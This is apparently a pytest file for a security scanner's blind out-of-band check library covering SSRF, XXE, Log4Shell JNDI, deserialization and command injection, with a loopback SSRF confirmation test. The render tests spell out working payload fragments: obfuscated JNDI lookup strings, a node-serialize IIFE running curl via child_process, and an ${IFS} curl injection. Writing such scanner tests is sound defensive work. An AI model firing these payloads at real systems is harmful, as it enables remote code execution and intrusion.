"""
Milestone-3 module B — BLIND-class (out-of-band / callback-confirmed) breadth
for the declarative check library.

Blind bug classes (SSRF, XXE, deserialization/RCE, JNDI/Log4Shell, OS command
injection) leave no in-band signal — the proof is an INBOUND interaction the
payload triggers against attacker-controlled infrastructure. Every ``m3-blind-*``
entry is DATA (``library_entries/m3_blind_*.json``) whose ``oob`` oracle compiles
to an :class:`OOBCheck` and whose ``bug_class`` routes to ``OOB_CALLBACK`` in
``verifier.BUG_CLASS_ORACLES`` — so it can actually confirm end-to-end via a real
callback, never a guess.

This suite proves, for every new entry:

  * the WHOLE library (100 existing seed/m2 entries + these) loads with NO
    duplicate-id error, and each ``m3-blind-*`` id is unique and well-formed;
  * it compiles via :func:`compile_entry` to an :class:`OOBCheck` carrying the
    ``{callback}`` placeholder;
  * its ``bug_class`` routes to ``OOB_CALLBACK`` (asserted programmatically over
    every entry through both the raw table and the public router);
  * rendering ``payload_template`` with a sample callback URL yields a string
    CONTAINING that URL — which proves the ``{callback}`` placeholder is present
    and, for the ``${...}`` JNDI / brace-heavy node/.NET forms, that the
    brace-doubling survives ``str.format`` intact.

One end-to-end case stands up a real loopback :class:`OOBReceiver`, drives an
SSRF entry's :meth:`OOBCheck.probe` with a ``send`` that performs the server-side
fetch of the minted callback, and asserts the OOB oracle CONFIRMS — the blind
proof the whole class exists for.
"""

from __future__ import annotations

import contextlib
import re
import threading
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Iterator

import pytest

from framework.v2.scanner.checks import Check, OOBCheck
from framework.v2.scanner.insertion import HttpRequest, InsertionKind, RequestTemplate
from framework.v2.scanner.library import LibraryEntry, compile_entry, load_library
from framework.v2.verify.confirmation import confirm_finding
from framework.v2.verify.models import OracleKind
from framework.v2.verify.oob import OOBReceiver
from framework.v2.verify.verifier import (
    BUG_CLASS_ORACLES,
    OracleVerifier,
    normalize_bug_class,
)

M3_PREFIX = "m3-blind-"

# The task's own suggested sample callback (a full loopback URL). Every OOB
# template must render to a string that CONTAINS it verbatim.
SAMPLE_CB = "http://127.0.0.1:9/tok"


# ---------------------------------------------------------------------------
# fixtures: the m3-blind-* subset loaded from the shipped library directory
# ---------------------------------------------------------------------------


def _all_entries() -> list[LibraryEntry]:
    return load_library()


def _m3_entries() -> list[LibraryEntry]:
    return [e for e in _all_entries() if e.id.startswith(M3_PREFIX)]


def _by_id(entry_id: str) -> LibraryEntry:
    return next(e for e in _m3_entries() if e.id == entry_id)


def _prefix(pfx: str) -> list[LibraryEntry]:
    return [e for e in _m3_entries() if e.id.startswith(pfx)]


# ---------------------------------------------------------------------------
# load + validate: whole directory loads; m3-blind ids unique and well-formed
# ---------------------------------------------------------------------------


def test_whole_library_loads_without_duplicate_ids() -> None:
    # load_library reads the ENTIRE dir (seed + m2 + our m3) and raises a
    # LibraryError on any duplicate id — a clean load proves our ids don't
    # collide with the ~100 existing entries.
    entries = _all_entries()
    assert entries, "library failed to load"
    ids = [e.id for e in entries]
    assert len(ids) == len(set(ids)), "duplicate ids across the whole library"


def test_m3_blind_present_and_prefixed() -> None:
    m3 = _m3_entries()
    assert 30 <= len(m3) <= 60, f"expected ~30-40 m3-blind entries, got {len(m3)}"
    ids = [e.id for e in m3]
    assert len(ids) == len(set(ids)), "duplicate m3-blind ids"
    assert all(i.startswith(M3_PREFIX) for i in ids)


def test_m3_blind_entries_are_rich() -> None:
    for e in _m3_entries():
        assert e.title, e.id
        assert e.severity in {"Critical", "High", "Medium", "Low", "Info"}, e.id
        assert e.references, f"{e.id} carries no reference"
        assert any(r.startswith("CWE-") for r in e.references), f"{e.id} lacks a CWE id"
        assert e.remediation, f"{e.id} carries no remediation"
        assert e.payload_family, f"{e.id} carries no payload_family"


def test_m3_blind_only_oob_oracle_kind() -> None:
    # the whole module is BLIND — every entry must be the oob shape
    kinds = {e.oracle.kind for e in _m3_entries()}
    assert kinds == {"oob"}, f"expected only oob oracle kinds, got {kinds}"


def test_m3_blind_severity_rules() -> None:
    # Critical for rce/deserialization/command_injection; High for ssrf/blind_xxe
    for e in _m3_entries():
        if e.bug_class in ("command_injection", "deserialization", "rce"):
            assert e.severity == "Critical", f"{e.id} ({e.bug_class}) must be Critical"
        elif e.bug_class in ("ssrf", "blind_xxe"):
            assert e.severity == "High", f"{e.id} ({e.bug_class}) must be High"
        else:  # pragma: no cover - guards against an unexpected class slipping in
            pytest.fail(f"{e.id}: unexpected bug_class {e.bug_class!r}")


def test_m3_blind_cwe_matches_class() -> None:
    expected = {
        "ssrf": "CWE-918",
        "blind_xxe": "CWE-611",
        "command_injection": "CWE-78",
    }
    for e in _m3_entries():
        want = expected.get(e.bug_class)
        if want is not None:
            assert want in e.references, f"{e.id} should carry {want}"
        else:
            # deserialization / rce (incl. JNDI/Log4Shell) -> CWE-502 and/or CWE-917
            assert ("CWE-502" in e.references or "CWE-917" in e.references), e.id


def test_m3_blind_breadth_per_class() -> None:
    # every named blind sub-family is represented, going BROADER than the m2 set
    assert len(_prefix("m3-blind-ssrf-")) >= 8, "blind SSRF breadth"
    assert len(_prefix("m3-blind-xxe-")) >= 6, "blind XXE breadth"
    assert len(_prefix("m3-blind-jndi-")) >= 5, "JNDI/Log4Shell breadth"
    assert len(_prefix("m3-blind-deser-")) >= 6, "deserialization/RCE gadget breadth"
    assert len(_prefix("m3-blind-cmdi-")) >= 8, "blind OS command-injection breadth"


def test_some_entries_are_fingerprint_gated() -> None:
    # the task asks for a MIX: most always-on, a few gated where sensible
    gated = [e for e in _m3_entries() if e.applies_when != {"always": True}]
    always = [e for e in _m3_entries() if e.applies_when == {"always": True}]
    assert gated, "expected a few fingerprint-gated entries (php/java/python/windows/...)"
    assert always, "expected most entries to be always-applicable"
    # a Java/JNDI-style and a PHP-style gate exist, per the task's examples
    cats = {tuple(e.applies_when.items())[0] for e in gated}
    assert ("category", "windows") in cats
    assert ("category", "php") in cats
    assert ("category", "java") in cats
    # every gated predicate is structurally valid (category/tech single-op)
    for e in gated:
        assert set(e.applies_when) <= {"category", "tech", "any", "all", "not", "always"}, e.id


# ---------------------------------------------------------------------------
# compile: each entry becomes an OOBCheck carrying the {callback} placeholder
# ---------------------------------------------------------------------------


def test_every_m3_blind_compiles_to_oobcheck() -> None:
    for e in _m3_entries():
        check = compile_entry(e)
        assert isinstance(check, Check), e.id
        assert isinstance(check, OOBCheck), e.id
        assert check.id == e.id
        assert check.bug_class == e.bug_class
        assert getattr(check, "wants_oob", False) is True, e.id
        assert "{callback}" in check.payload_template, e.id


# ---------------------------------------------------------------------------
# routing: EVERY entry's bug_class routes to OOB_CALLBACK — the ONLY oracle that
# can confirm a blind class. An entry that routed elsewhere would be a dud.
# ---------------------------------------------------------------------------


def test_every_m3_blind_bug_class_is_routed() -> None:
    for e in _m3_entries():
        key = normalize_bug_class(e.bug_class)
        assert key in BUG_CLASS_ORACLES, (
            f"{e.id}: bug_class {e.bug_class!r} (norm {key!r}) not in BUG_CLASS_ORACLES"
        )


def test_every_m3_blind_routes_to_oob_callback() -> None:
    # assert programmatically over ALL entries, via the raw table ...
    for e in _m3_entries():
        oracles = BUG_CLASS_ORACLES[normalize_bug_class(e.bug_class)]
        assert OracleKind.OOB_CALLBACK in oracles, (
            f"{e.id}: bug_class {e.bug_class!r} does not route to OOB_CALLBACK ({oracles})"
        )


def test_verifier_router_agrees_and_includes_oob() -> None:
    # ... and via the public router the verifier actually uses
    v = OracleVerifier()
    for e in _m3_entries():
        kinds = v.oracles_for(e.bug_class)
        assert kinds == BUG_CLASS_ORACLES[normalize_bug_class(e.bug_class)], e.id
        assert OracleKind.OOB_CALLBACK in kinds, e.id


# ---------------------------------------------------------------------------
# render: {callback} placeholder is correct and brace-doubling survives format
# ---------------------------------------------------------------------------


def test_every_entry_renders_callback_without_error() -> None:
    for e in _m3_entries():
        check = compile_entry(e)
        rendered = check.payload_template.format(callback=SAMPLE_CB)  # must not raise
        assert SAMPLE_CB in rendered, f"{e.id} did not render the callback:\n{rendered}"
        # no stray unrendered placeholder remains
        assert "{callback}" not in rendered, f"{e.id} left a stray placeholder"


@pytest.mark.parametrize(
    "entry_id,expected_fragment",
    [
        # the ${...} JNDI forms: brace-doubling must collapse to single ${...}
        ("m3-blind-jndi-dns", "${jndi:dns://" + SAMPLE_CB + "}"),
        ("m3-blind-jndi-obf-lower", "${${lower:j}ndi:ldap://" + SAMPLE_CB + "/a}"),
        (
            "m3-blind-jndi-obf-colon-default",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://" + SAMPLE_CB + "/a}",
        ),
        # brace-heavy node-serialize IIFE renders to valid single-brace JS/JSON
        (
            "m3-blind-deser-node-serialize-iife",
            "require('child_process').exec('curl http://" + SAMPLE_CB + "');}()",
        ),
        # ${IFS} shell bypass collapses correctly
        ("m3-blind-cmdi-ifs", ";curl${IFS}http://" + SAMPLE_CB + ";"),
    ],
)
def test_brace_doubling_renders_exact(entry_id: str, expected_fragment: str) -> None:
    check = compile_entry(_by_id(entry_id))
    rendered = check.payload_template.format(callback=SAMPLE_CB)
    assert expected_fragment in rendered, f"{entry_id} rendered:\n{rendered}"
    # the raw (unrendered) template must still contain a lone {callback} for OOBCheck
    assert "{callback}" in check.payload_template


# ---------------------------------------------------------------------------
# end-to-end (ONE entry): a real loopback OOBReceiver confirms blind SSRF
# ---------------------------------------------------------------------------


_LOOPBACK_CB = re.compile(r"http://127\.0\.0\.1:\d+/[0-9a-fA-F]{16,}")


class _SSRFTarget(BaseHTTPRequestHandler):
    """Vulnerable: extracts the loopback callback URL from the injected value and
    fetches it server-side (the SSRF), regardless of the scheme decoration the
    payload wraps around it — so any blind-SSRF FORM lands on the receiver."""

    def log_message(self, *args: object) -> None:
        return

    def do_GET(self) -> None:  # noqa: N802
        raw = urllib.parse.unquote(self.path)
        m = _LOOPBACK_CB.search(raw)
        if m:
            with contextlib.suppress(Exception):
                urllib.request.urlopen(m.group(0), timeout=2).read()  # server-side fetch
        body = b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


@contextlib.contextmanager
def _server(handler: type[BaseHTTPRequestHandler]) -> Iterator[str]:
    srv = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    srv.daemon_threads = True
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    try:
        yield f"http://127.0.0.1:{srv.server_address[1]}"
    finally:
        srv.shutdown()
        srv.server_close()
        th.join(timeout=5)


def _send(req: HttpRequest) -> dict:
    with urllib.request.urlopen(req.url, timeout=10) as r:  # noqa: S310 (loopback)
        return {"status": r.status, "body": r.read().decode("utf-8", "replace")}


def test_blind_ssrf_entry_confirmed_by_real_oob_callback() -> None:
    entry = _by_id("m3-blind-ssrf-protocol-relative")
    check = compile_entry(entry)
    assert isinstance(check, OOBCheck)

    with _server(_SSRFTarget) as base, OOBReceiver() as oob:
        tpl = RequestTemplate(HttpRequest(method="GET", url=f"{base}/fetch?url=x"))
        point = next(
            p
            for p in tpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
            if p.name == "url"
        )
        ctx = check.probe(tpl, point, _send, oob)

    confirmed = confirm_finding(
        finding={"bug_class": check.bug_class}, context=ctx, verifier=OracleVerifier()
    )
    assert confirmed is not None, "blind SSRF was not confirmed by an out-of-band callback"
    assert confirmed.confirmed_by == OracleKind.OOB_CALLBACK
    assert 0.0 < confirmed.confidence <= 1.0


def test_blind_ssrf_no_callback_no_confirmation() -> None:
    # negative control: a target that never fetches confirms nothing
    class _SafeTarget(BaseHTTPRequestHandler):
        def log_message(self, *args: object) -> None:
            return

        def do_GET(self) -> None:  # noqa: N802
            body = b"ok"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    check = OOBCheck(
        id="m3-blind-ssrf-protocol-relative",
        bug_class="ssrf",
        payload_template=_by_id("m3-blind-ssrf-protocol-relative").oracle.payload_template,
        poll_deadline=0.3,  # keep the negative control fast — no hit will ever land
    )
    with _server(_SafeTarget) as base, OOBReceiver() as oob:
        tpl = RequestTemplate(HttpRequest(method="GET", url=f"{base}/fetch?url=x"))
        point = next(
            p
            for p in tpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
            if p.name == "url"
        )
        ctx = check.probe(tpl, point, _send, oob)

    confirmed = confirm_finding(
        finding={"bug_class": "ssrf"}, context=ctx, verifier=OracleVerifier()
    )
    assert confirmed is None, "a target that makes no callback must not be confirmed"
